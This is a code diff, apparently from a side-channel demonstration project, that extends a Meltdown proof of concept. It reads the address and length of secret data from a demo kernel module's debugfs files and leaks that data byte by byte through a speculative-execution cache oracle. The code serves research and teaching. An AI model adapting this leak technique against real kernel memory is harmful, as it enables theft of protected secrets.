@@ -19,6 +19,7 @@
 
 #include <array>
 #include <cstring>
+#include <fstream>
 #include <iostream>
 
 #include <signal.h>
@@ -37,6 +38,12 @@ static char LeakByte(const char *data, size_t offset) {
   const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
+    // Load the secret data into cache so it is more likely to be available
+    // to transient instructions.
+    std::ifstream is("/sys/kernel/debug/safeside_meltdown/secret_data_in_cache");
+    is.get();
+    is.close();
+
     size_t safe_offset = run % strlen(public_data);
     sidechannel.FlushOracle();
 
@@ -84,10 +91,30 @@ static char LeakByte(const char *data, size_t offset) {
 
 int main() {
   OnSignalMoveRipToAfterspeculation(SIGUSR1);
+
+  size_t private_data, private_length;
+  std::ifstream in("/sys/kernel/debug/safeside_meltdown/secret_data_address");
+  if (in.fail()) {
+    std::cerr << "Meltdown module not loaded or not running as root."
+              << std::endl;
+    exit(EXIT_FAILURE);
+  }
+  in >> std::hex >> private_data;
+  in.close();
+  
+  std::cout << "Address of private_data in kernel module: " << std::hex << private_data << std::endl;
+
+  in.open("/sys/kernel/debug/safeside_meltdown/secret_data_length");
+  in >> std::dec >> private_length;
+  in.close();
+
+  std::cout << "Length of private_data in kernel module: " << std::hex << private_length << std::endl;
+
   std::cout << "Leaking the string: ";
   std::cout.flush();
-  const size_t private_offset = private_data - public_data;
-  for (size_t i = 0; i < strlen(private_data); ++i) {
+  const size_t private_offset =
+      reinterpret_cast<const char *>(private_data) - public_data;
+  for (size_t i = 0; i < private_length; ++i) {
     std::cout << LeakByte(public_data, private_offset + i);
     std::cout.flush();
   }
